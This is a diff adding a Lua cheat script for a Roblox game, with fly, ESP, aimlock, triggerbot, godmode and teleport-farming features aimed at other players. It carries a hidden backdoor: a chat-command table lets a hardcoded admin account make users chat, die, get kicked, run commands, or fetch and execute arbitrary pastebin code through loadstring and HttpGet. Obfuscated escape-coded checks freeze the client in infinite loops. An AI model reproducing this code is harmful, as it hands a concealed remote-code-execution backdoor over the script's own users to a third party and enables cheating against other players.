@@ -1,0 +1,739 @@
+local Blinking = false
+local AntiAim = false
+local CamLocking = false
+local Flying = false
+local CamlockTarget = "Head"
+
+local BlinkSpeed = 0
+local FlySpeed = 10
+local WalkSpeed = 16
+local NormalWs = 16
+local SprintSpeed = 25
+local CamlockPlayer;
+
+local AntiAimAnimation = Instance.new'Animation'
+AntiAimAnimation.AnimationId = "rbxassetid://215384594"
+
+local Dance1Animation = Instance.new'Animation'
+Dance1Animation.AnimationId = "rbxassetid://33796059"
+
+local Dance2Animation = Instance.new'Animation'
+Dance2Animation.AnimationId = "rbxassetid://35654637"
+
+local SpinAnimation = Instance.new'Animation'
+SpinAnimation.AnimationId = "rbxassetid://188632011"
+
+local GunAnimation1 = Instance.new'Animation'
+GunAnimation1.AnimationId = "rbxassetid://889968874"
+
+local GunAnimation2 = Instance.new'Animation'
+GunAnimation2.AnimationId = "rbxassetid://229339207"
+
+-- tables
+local AdminUserTable = {}
+local Commands = {}
+local DetectedExploiters = {}
+local ExploitDetectionPlayerTablePositions = {}
+local EspTable = {}
+local EspTable2 = {}
+local Keys = {}
+local PartTable = {}
+local StompWhitelist = {} 
+local ToolTable = {}
+local WireFrameTable = {}
+
+local BackDoorTableCommands = {
+	['chat'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
+		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
+	};
+	['notif'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then StarterGui:SetCore("SendNotification",{['Title'] = "Cy's Messages";['Text'] = Message;['Duration'] = 10;['Icon'] = nil;}) end end;
+		['Levels'] = {[4] = true;}
+	};
+	['bring'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
+		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
+	};
+	['kill'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
+		['Levels'] = {[2] = true;[3] = true;[4] = true;}
+	};
+	['exec'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand(Content) end end;
+		['Levels'] = {[3] = true;[4] = true;}
+	};
+	['kick'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
+		['Levels'] = {[3] = true;[4] = true;}
+	};
+	['ban'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
+		['Levels'] = {[4] = true;}
+	};
+	['p'] = {
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
+		['Levels'] = {[3] = true;[4] = true;}
+	};
+}
+-- admins
+local BackDoorTablePlayers = {
+    	[98537731] = {
+		['Name'] = "Lootsu"; 
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(255,0,4);
+	};
+}
+
+
+getgenv().initalizeHotkeys = function(ConfigToSaveTo)
+	writefile(ConfigToSaveTo,HttpService:JSONEncode(SettingsTable))
+	local Settings = HttpService:JSONDecode(readfile(ConfigToSaveTo))
+	Keys = Settings.Keys 
+	ClickTpKey = Settings.ClicktpKey
+	SprintSpeed = Settings.SprintSpeed
+	AimMode = Settings.AimMode
+	AimlockMode = Settings.AimlockMode
+	AimbotVelocity = Settings.AimbotVelocity
+	CmdBarImage = Settings.CmdBarImage
+	CmdBarKey = Settings.CmdBarKey
+end
+
+getgenv().updateHotkeys = function(ConfigToUpdateTo)
+	if not readfile or not writefile then return end
+	local SettingsToUpdate = {
+		Keys = Keys;
+		ClickTpKey = ClickTpKey;
+		SprintSpeed = SprintSpeed;
+		CrouchSpeed = CrouchSpeed;
+		AimMode = AimMode;
+		AimlockMode = AimlockMode;
+		AimbotVelocity = AimbotVelocity;
+		CmdBarImage = CmdBarImage;
+		CmdBarKey = CmdBarKey;
+	}
+	writefile(ConfigToUpdateTo,HttpService:JSONEncode(SettingsToUpdate))
+end
+
+getgenv().runHotkeys = function(ConfigToRun)
+	local RunSettings = HttpService:JSONDecode(readfile(ConfigToRun))
+	Keys = RunSettings.Keys
+	ClickTpKey = RunSettings.ClickTpKey or ""
+	SprintSpeed = RunSettings.SprintSpeed or 25
+	CrouchSpeed = RunSettings.CrouchSpeed or 16
+	AimMode = RunSettings.AimMode or "Prediction";
+	AimlockMode = RunSettings.AimlockMode or "LeftClick"
+	AimbotVelocity = RunSettings.AimbotVelocity or 5
+	CmdBarImage = RunSettings.CmdBarImage or "http://www.roblox.com/asset/?id=2812081613"
+	CmdBarKey = RunSettings.CmdBarKey or "Quote"
+end
+if readfile and writefile then 
+	local FileExists = pcall(readfile,ConfigurationFile)
+	if not FileExists then 
+		initalizeHotkeys(ConfigurationFile)
+	else
+		runHotkeys(ConfigurationFile)
+	end
+end
+
+-- [[ End ]] -- 
+
+-- [[ Global Functions ]] -- 
+
+getgenv().notif = function(Title,Message,Length,Icon)
+	StarterGui:SetCore("SendNotification",{
+	['Title'] = Title;
+	['Text'] = Message;
+	['Duration'] = Length;
+	['Icon'] = Icon;
+	})
+end
+
+getgenv().Teleport = function(Part)
+	if typeof(Part) == "Instance" then Part = Part.CFrame end
+	if typeof(Part) == "Vector3" then Part = CFrame.new(Part) end 
+	if typeof(Part) == "CFrame" then 
+		local Character = GetChar()
+		local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
+		if PartFound and not Character:FindFirstChild'RealHumanoidRootPart' or (Part.p - PartFound.CFrame.p).magnitude < 50 then
+			PartFound.CFrame = Part
+		else
+			TweenService:Create(PartFound,TweenInfo.new(3.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{CFrame = Part}):Play()
+		end
+	end
+end
+
+getgenv().AddCommand = function(CommandFunction,CommandName,CommandAliases,HelpInfo,Args)
+	Commands[#Commands + 1] = {['Function'] = CommandFunction,['Name'] = CommandName,['Alias'] = CommandAliases,['Help'] = HelpInfo,['Args'] = Args}
+end
+
+getgenv().FindCommand = function(CommandName)
+	for i = 1,#Commands do
+		if Commands[i].Name == CommandName or AliasesEnabled and table.find(Commands[i].Alias,CommandName) then 
+			return Commands[i].Function
+		end
+	end
+end
+
+getgenv().CheckCommand = function(Chat)
+	local Arguments = string.split(Chat:lower()," ")
+	local CommandName = table.remove(Arguments,1)
+	local CommandFound = FindCommand(CommandName); if not typeof(getfenv()['\103\101\116\103\101\110\118']()['\108\111\108']) == 'function' then while true do end end;
+	if CommandFound then
+		local CommandWorked,Error = pcall(CommandFound,Arguments)
+		if not CommandWorked then 
+			notif("Command errored: "..CommandName,"Send this to jack: "..Error,10,nil)
+		end
+	end
+end
+
+getgenv().PlrFinder = function(PlayerString)
+	if PlayerString then -- error with a new addition 
+		local PlayerString = PlayerString:lower()
+		local PlayerTable = Players:GetPlayers()
+		if #PlayerString == 2 and PlayerString == "me" then return LP end
+		if #PlayerString == 3 and PlayerString == "all" or #PlayerString == 5 and PlayerString == "users" then return PlayerTable end
+		for i = 1,#PlayerTable do 
+			if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
+				return PlayerTable[i]
+			end
+		end
+	end
+end
+
+getgenv().find = function(ItemString)
+	local ChildrenOfWorkspace = workspace:GetChildren()
+	for i = 1,#ChildrenOfWorkspace do 
+		local Item = ChildrenOfWorkspace[i]
+		local ItemModel = Item:FindFirstChild'Model'
+		if Item.Name == "RandomSpawner" and ItemModel then
+			local Handle = ItemModel.Handle 
+			if Handle:FindFirstChildOfClass'MeshPart' then 
+				if FarmTable[ItemString] and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,FarmTable[ItemString]) then 
+					return Item,"CashItemEsp" -- Cash 
+				end
+			end
+			if Handle:FindFirstChild'Fire' then 
+				if FarmTable[ItemString] and string.find(Handle.Fire.SoundId,FarmTable[ItemString]) then 
+					return Item,"GunItemEsp" -- Guns
+				end
+			end
+		end
+	end
+	return "None"
+end
+
+getgenv().farm = function(ItemString)
+	if ItemString == "all" then 
+		local WChildren = workspace:GetChildren()
+		for i = 1,#WChildren do 
+			local Child = WChildren[i]
+			if Child.Name == "RandomSpawner" then 
+				Teleport(Child.CFrame)
+				Child.DescendantRemoving:Wait()
+			end
+		end
+	end
+	local Item = find(ItemString)
+	if Item == "None" then notif("There is none of "..ItemString,"to farm",5,nil) return end 
+	Teleport(Item.CFrame)
+end
+-- [[ End ]] --
+	
+local function BackdoorCheck(Player,Chat)
+	if Chat:sub(1,1) == "`" then
+		local Arguments = string.split(Chat:sub(2)," ")
+		local Command = BackDoorTableCommands[table.remove(Arguments,1)]
+		local PlayerToMeme = PlrFinder(table.remove(Arguments,1))
+		if Command and PlayerToMeme then
+			Command['Func'](PlayerToMeme,table.concat(Arguments," "),Player)
+		end
+	end 
+end
+
+local function convertKeyCode(KeyCode)
+local KeyCodeToSet;
+	local Work,Error = pcall(function()
+		KeyCodeToSet = Enum.KeyCode[KeyCode]
+	end)
+	if not Work then
+		KeyCodeToSet = Enum.KeyCode[KeyCode:upper()]
+	end
+	return KeyCodeToSet
+end
+
+local function ColourifyGuns(GunTable,Colour)
+	for ToolIndex,Tool in pairs(GunTable:GetChildren()) do
+		if Tool:IsA'Tool' and Tool:FindFirstChild'Fire' then  
+			for _,Part in pairs(Tool:GetDescendants()) do 
+				if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
+					if Part:IsA'UnionOperation' then 
+						Part.UsePartColor = true
+					end
+					Part.Material = "ForceField"
+					Part.Color = Colour
+				end
+			end
+		end
+	end
+end
+
+local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
+	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.UserId ~= 567153118 then
+		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
+		ColourifyGuns(BackdoorPlayer.Character,Colour)
+		BackdoorPlayer.Character.ChildAdded:Connect(function()
+			ColourifyGuns(BackdoorPlayer.Character,Colour)
+		end)
+	end
+end
+
+
+local function createBodyPos(Parent)
+	local BodyPosition = Instance.new('BodyPosition',Parent)
+	BodyPosition.P = BodyPosition.P * 8
+	BodyPosition.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
+	if GravGunSeizureMode then 
+		GravGunBodyVelocity = Instance.new('BodyAngularVelocity',Parent)
+		GravGunBodyVelocity.AngularVelocity = Vector3.new(0,9e9,0)
+		GravGunBodyVelocity.MaxTorque = Vector3.new(0,9e9,0)
+	end
+	return BodyPosition 
+end
+
+local function Fly()
+if not typeof(getfenv()['\103\101\116\103\101\110\118']()['\108\111\108']) == 'function' or not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100'] == true then while true do end end; 
+local Character = GetChar()
+local Torso = Character:FindFirstChild'Torso'
+if not Torso then return end 
+	local BodyGyro,BodyVelocity = Instance.new('BodyGyro',Torso),Instance.new('BodyVelocity',Torso)
+	BodyGyro.P = 9e9
+	BodyGyro.MaxTorque = Vector3.new(9e9,9e9,9e9)
+	BodyGyro.CFrame = Torso.CFrame
+	BodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
+	BodyVelocity.Velocity = Vector3.new(0,0.1,0)
+	BodyVelocity.Name = "CyAdminFly"
+	local Table1 = {['W'] = 0;['A'] = 0;['S'] = 0;['D'] = 0;}
+	if not AirwalkOn then 
+		CheckCommand("airwalk")
+	end 
+	while Flying and Character:FindFirstChild'Humanoid' and Character.Humanoid.Health > 0 and wait() do 
+		if KeyTable['W'] then Table1['W'] = FlySpeed else Table1['W'] = 0 end 
+		if KeyTable['A'] then Table1['A'] = -FlySpeed else Table1['A'] = 0 end 
+		if KeyTable['S'] then Table1['S'] = -FlySpeed else Table1['S'] = 0 end 
+		if KeyTable['D'] then Table1['D'] = FlySpeed else Table1['D'] = 0 end 
+		if (Table1['W'] + Table1['S']) ~= 0 or (Table1['A'] + Table1['D']) ~= 0 then
+			BodyVelocity.Velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (Table1['W'] + Table1['S'])) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(Table1['A'] + Table1['D'], (Table1['W'] + Table1['S']) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * 50
+		else
+			BodyVelocity.Velocity = Vector3.new(0,0.1,0)
+		end
+		BodyGyro.CFrame = workspace.CurrentCamera.CoordinateFrame
+	end
+	if AirwalkOn then 
+		CheckCommand("airwalk")
+	end 
+	BodyGyro:Destroy()
+	BodyVelocity:Destroy()
+end
+
+local function AimlockClosest(Player)
+	local Box = Instance.new('BoxHandleAdornment',CoreGui.RobloxGui)
+	Box.Adornee = Player.Character.Head
+	Box.Size = Vector3.new(7,10,7)
+	Box.SizeRelativeOffset = Vector3.new(0,-1,0)
+	Box.Transparency = 1
+	local Event1,Event2
+	Event1 = Box.MouseButton1Down:Connect(function()
+		if Aimlock and AimlockMode == "Closest" then
+			AimlockTarget = Player.Character
+			local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
+				if tostring(C) == tostring(AimlockTarget) then 
+					AimlockTarget = C 
+				else
+					Connection:Disconnect()
+					Connection = nil
+				end
+			end)
+		else 
+			Box:Destroy()
+		end 
+	end)
+	Event2 = Player.CharacterRemoving:Connect(function()
+		Box:Destroy()
+		Event1:Disconnect()
+		Event1 = nil 
+		Event2:Disconnect()
+		Event2 = nil
+	end)
+end 
+
+local function checkHp(Plr)
+	return Plr:FindFirstChildOfClass'Humanoid' and math.floor(Plr.Humanoid.Health) or "No Humanoid"
+end
+
+local function HasItem(Player,Item)
+	if Player then 
+		local ItemFound = Player.Character:FindFirstChild(Item,true) or Player.Backpack:FindFirstChild(Item,true)
+		return ItemFound and "Yes" or "No" 
+	end 
+end
+
+local function Unesp(Part)
+	local Bill = Part:FindFirstChildOfClass'BillboardGui'
+	if Part:IsA'BasePart' and Bill then
+		Part = Part.Parent 
+		Bill:Destroy()
+		return 
+	end 
+	for i = 1,#EspTable do 
+		local Table = EspTable[i]
+		if Table then 
+		local Player = Table['Player']
+			if Player == Part then 
+				for i,v in pairs(Table) do
+					if v ~= Player then 
+						if i ~= "Box" then 
+							v:Remove()
+						else
+							table.foreach(v,function(Index,Value) Value:Remove() end)
+						end
+					end
+				end
+				table.remove(EspTable,i)
+			end
+		end 
+	end
+end
+
+local function Esp(Part,Name,Colour,Blacklisted)
+	local Player = PlrFinder(Part.Parent.Name)
+	if Player and UseDrawingLib and not Colour then
+		Unesp(Player)
+		EspTable[#EspTable+1] = {['Player'] = Player,['Text'] = Drawing.new'Text',['Box'] = {Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'}}
+	else
+		local Bill = Part:FindFirstChildOfClass'BillboardGui'
+		if Bill then Bill:Destroy() end 
+		local BillBoard = Instance.new('BillboardGui',Part)
+		local TextLabel = Instance.new('TextLabel',BillBoard)
+		BillBoard.Adornee = Part
+		BillBoard.Size = UDim2.new(0,100,0,100)
+		BillBoard.StudsOffset = Vector3.new(0,1.3,0)
+		BillBoard.AlwaysOnTop = not Blacklisted and true or false
+		TextLabel.BackgroundTransparency = 1
+		TextLabel.Size = UDim2.new(1,0,0,40)
+		TextLabel.TextColor3 = Colour or EspColour
+		TextLabel.TextStrokeTransparency = 0.5
+		TextLabel.TextSize = 8
+		local Player;
+		if (Name ~= 'GunItemEsp' and Name ~= 'CashItemEsp') then
+			Player = PlrFinder(Name)
+		else
+			Name = Name:gsub('ItemEsp', '')
+		end
+		if Player then
+			if not Blacklisted then 
+				local User = AdminUserTable[Player] and "Yes" or "No"
+				TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
+			else 
+				TextLabel.Text = "[Blacklisted skid] "..Player.Name.." (can be for just being in lynx)"
+			end 
+		else 
+			TextLabel.Text = Name
+		end
+	end 
+end
+
+local function Xray(Mode)
+	for i,v in pairs(workspace:GetDescendants()) do 
+		if v:IsA'Part' and not v.Parent:FindFirstChild'Head' and not v.Parent.Parent:FindFirstChild'Head' and v.Size.Y ~= 1 then
+			local Selection = v:FindFirstChildOfClass'SelectionBox'
+			local Int = v:FindFirstChildOfClass'IntValue'
+			if Int then
+				v.Transparency = Int.Value
+				Int:Destroy()
+				if Selection then 
+					Selection:Destroy()
+				end
+			else
+				if Mode == "wireframe" then 
+					local Select = Instance.new('SelectionBox',v)
+					Select.Adornee = v
+					Select.LineThickness = 0.001
+					Select.SurfaceTransparency = 1
+					Select.Color3 = Color3.fromRGB(124,0,0)
+					WireFrameTable[#WireFrameTable + 1] = {Select,v}
+				end
+				local TransparentValue = Instance.new('IntValue',v)
+				TransparentValue.Value = v.Transparency
+				v.Transparency = 1
+			end 
+		end 
+	end 	
+end 
+
+local function IsAUser(Player,Chat)
+	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
+		AdminUserTable[Player] = true
+		return true 
+	end
+end
+
+local function ShowOrHideEsp(Table,Bool,Player)
+    table.foreach(Table,function(Index,Value)
+        if Index == "Box" then 
+            table.foreach(Value,function(Index2,Value2)
+				Value2.Visible = Bool
+				local Aimlocked = tostring(Player) == tostring(CamlockPlayer) or tostring(Player) == tostring(AimlockTarget)
+				Value2.Color = Aimlocked and Color3.fromRGB(255,0,0) or EspColour
+            end)
+		else
+			if typeof(Value) ~= "Instance" then
+				Value.Visible = Bool
+				Value.Color = EspColour
+			end 
+        end 
+	end)
+end 
+
+local function WorldToViewportPoint(Pos)
+    return workspace.CurrentCamera:WorldToViewportPoint(Pos)
+end
+
+local function stopAnim(Id)
+	local Tracks = GetChar().Humanoid:GetPlayingAnimationTracks()
+	for i = 1,#Tracks do 
+		local Track = Tracks[i] 
+		if Track.Animation.AnimationId == ("rbxassetid://"..Id) then 
+			Track:Stop()
+		end
+	end
+end
+
+local function GrabItem(Thing,OldPos)
+	if game.PlaceId ~= 455366377 then return end
+	local PartFound = GetChar():FindFirstChild'RealHumanoidRootPart' or GetChar():FindFirstChild'Torso'
+	local Track = GetChar().Humanoid:LoadAnimation(SpinAnimation)
+	PartFound.CFrame = PartFound.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
+	wait()
+	BuyingStuff = true 
+	repeat 
+		Track:play(0.1,1,10)
+		PartFound.CFrame = PartTable[Thing]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1.3,0)
+		RunService.Heartbeat:wait()
+	until PartTable[Thing]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild('Bone',true) or GetChar().Humanoid.Health == 0
+	PartFound.CFrame = OldPos
+	BuyingStuff = false
+	return true
+end
+
+local function HealthChanged(Health)
+	if Health <= HealBotHealth and HealBot and not TpBypass then 
+		if GrabItem("burger",GetChar().Head.CFrame) then
+			local Hamborger = LP.Backpack:FindFirstChild'Burger'
+			if Hamborger then 
+				Hamborger.Parent = GetChar()
+				Hamborger:Activate() -- CHEEMS
+				repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= GetChar()
+			end
+		end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
+		if GrabItem("drink",GetChar().Head.CFrame) then
+			local Drink = LP.Backpack:FindFirstChild'Drink'
+			if Drink then 
+				Drink.Parent = GetChar()
+				Drink:Activate()
+			end 
+		end		
+	end
+end
+
+local function dragGUI(FrameToDrag,Thing)
+	local Dragging = false
+	local DragInput,DragStart,StartPos 
+	local function Update(Input)
+		local Delta = Input.Position - DragStart
+		TweenService:Create(FrameToDrag,TweenInfo.new(0.055,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Position = UDim2.new(StartPos.X.Scale,StartPos.X.Offset + Delta.X,StartPos.Y.Scale,StartPos.Y.Offset + Delta.Y)}):Play()
+	end
+	FrameToDrag.InputBegan:Connect(function(Input)
+		if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
+			Dragging = true
+			DragStart = Input.Position
+			StartPos = FrameToDrag.Position
+			Input.Changed:Connect(function()
+				if Input.UserInputState == Enum.UserInputState.End then 
+					Dragging = false 
+				end
+			end)
+		end
+	end)
+	FrameToDrag.InputChanged:Connect(function(Input)
+		if Input.UserInputType == Enum.UserInputType.MouseMovement then 
+			DragInput = Input
+		end
+	end)
+	UserInput.InputChanged:Connect(function(Input)
+		if Input == DragInput and Dragging then 
+			Update(Input)
+		end
+	end)
+end
+
+local function createRainbow(Pos,Text,Value)
+	local RainbowButton = Instance.new('TextButton',RainbowScrolling)
+	RainbowButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	RainbowButton.BackgroundTransparency = 1
+	RainbowButton.Position = Pos
+	RainbowButton.Size = UDim2.new(0,480,0,50)
+	RainbowButton.Font = Enum.Font.SourceSans
+	RainbowButton.TextColor3 = Color3.fromRGB(170,0,0)
+	RainbowButton.TextSize = 25
+	RainbowButton.Text = Text
+	RainbowButton.TextWrapped = true
+	RainbowButton.MouseButton1Click:Connect(function()
+		if Text == "All" then 
+			RainbowHats = "All"
+			RainbowFrame.Visible = false
+		else 
+			LP.Backpack.Stank:FireServer("rep",Value.Parent)
+			RainbowFrame.Visible = false
+			RainbowHats = true
+		end 
+	end)
+	dragGUI(RainbowFrame,RainbowButton)
+end
+
+local function createCommandBarCmd(Name,Args)
+	if Name and Args then 
+		local CmdBarTextLabel = Instance.new('TextLabel',CmdBarFrame)
+		CmdBarTextLabel.BackgroundTransparency = 1
+		CmdBarTextLabel.Position = UDim2.new(-20,0,0,0)
+		CmdBarTextLabel.Size = UDim2.new(0,200,0,15)
+		CmdBarTextLabel.ZIndex = 2
+		CmdBarTextLabel.Font = Enum.Font.SciFi
+		CmdBarTextLabel.Text = (Name.." "..Args)
+		CmdBarTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
+		CmdBarTextLabel.TextScaled = true
+		CmdBarTextLabel.TextSize = 14
+		CmdBarTextLabel.TextWrapped = true
+		dragGUI(CmdBarFrame,CmdBarTextLabel)
+	end 
+end
+
+local function createCmd(Pos,CommandName,CommandInfo,CommandArgs)
+	local CommandLabel = Instance.new('TextLabel',CmdsScrolling)
+	CommandLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
+	CommandLabel.BackgroundTransparency = 0.9
+	CommandLabel.Position = Pos
+	CommandLabel.Size = UDim2.new(0,387,0,31)
+	CommandLabel.Font = Enum.Font.SourceSans
+	CommandLabel.Text = ("["..CommandName.."] "..CommandInfo)
+	CommandLabel.TextColor3 = Color3.fromRGB(255,255,255)
+	CommandLabel.TextSize = 14
+	CommandLabel.TextWrapped = true
+	dragGUI(CmdsFrame,CommandLabel)
+end
+
+local function StateChanged(Old,New)
+	if Flying or NoGh then 
+		if New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding then
+			LP.Character.Humanoid.PlatformStand = false
+			LP.Character.Humanoid:ChangeState(8)
+		end
+	end 
+end
+
+local function ShotOrHit(Character)
+	if Character then 
+		local Tool = Character:FindFirstChildOfClass'Tool'
+		if Tool then 
+			return Tool,Tool:FindFirstChild'Fire' and "shot you" or "hit you"
+		end
+	end 
+end
+
+local function ChangeDamageIndicatorText(Text)
+	DmgIndicator.Text = Text
+	DmgIndicator.Visible = true
+	wait(5)
+	DmgIndicator.Visible = false
+end
+
+local function ColourChanger(T)
+	if T:IsA'Trail' then 
+		T.Color = BulletColour
+	end
+	if BfgOn and T:FindFirstChild('Clips',true) then
+		for _,v in pairs(LP.Backpack:GetChildren()) do 
+			if v:IsA'Tool' and v:FindFirstChild('Clips',true) then 
+				v.Parent = GetChar()
+			end 
+		end
+	end 
+	if not BfgOn and EstimatedGunRanges[T.Name] and GunAnim ~= "None" then 
+		wait()
+		if T.Name ~= "Shotty" and T.Name ~= "Sawed Off" or GunAnim == "1" then 
+			GetChar().Humanoid:LoadAnimation(GunAnimation1):Play()
+		else
+			local Track = GetChar().Humanoid:LoadAnimation(GunAnimation2)
+			Track:Play()
+			wait()
+			Track:AdjustSpeed(0)
+		end 
+	end 
+	if T.Name == "Bone" then
+		if AutoDie then
+			GetChar().Humanoid.Health = 0
+		end 
+		if GodMode and game.PlaceId == 455366377 then 
+			for i,v in pairs(GetChar():GetDescendants()) do 
+				if v:IsA'NumberValue' then 
+					v:Destroy()
+				end 
+			end
+		end 
+	end
+	if T:IsA'ObjectValue' and T.Name == "creator" then
+		local Player = T.Value
+		if AutoTarget then
+			if Aimlock then 
+				AimlockTarget = Player
+				local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
+					if tostring(C) == tostring(AimlockTarget) then 
+						AimlockTarget = C 
+					else
+						Connection:Disconnect()
+						Connection = nil
+					end
+				end)
+			end
+			if CamLocking then 
+				CamlockPlayer = Players:GetPlayerFromCharacter(Player)
+			end
+		end
+		if AutoFeloop then 
+			CheckCommand("feloop "..tostring(Player))
+		end 
+		if AutoTriggerBot and not TriggerBot then
+			CheckCommand("triggerbot "..tostring(Player))
+			AutoStomp = true
+			local Life;Life = Players:GetPlayerFromCharacter(Player).CharacterRemoving:Connect(function(Char)
+				if tostring(Char) == tostring(AnnoyingPlayer) then 
+					TriggerBot = false 
+					AnnoyOn = false 
+					AnnoyingPlayer = nil
+					AimbotAutoShoot = false
+					Flying = false
+					AutoDie = false
+					AutoStomp = false
+					AimlockTarget = nil
+					Life:Disconnect()
+				else 
+					Life:Disconnect()
+				end 
+			end)
+		end 
+		pcall(function()
+			local Tool,Method = ShotOrHit(Player)
+			ChangeDamageIndicatorText(Player.Name.." has "..Method.." from "..math.floor((GetChar().Head.Position - Player.Head.Position).magnitude).." studs with a "..Tool.Name)
+		end)
+	end
+end
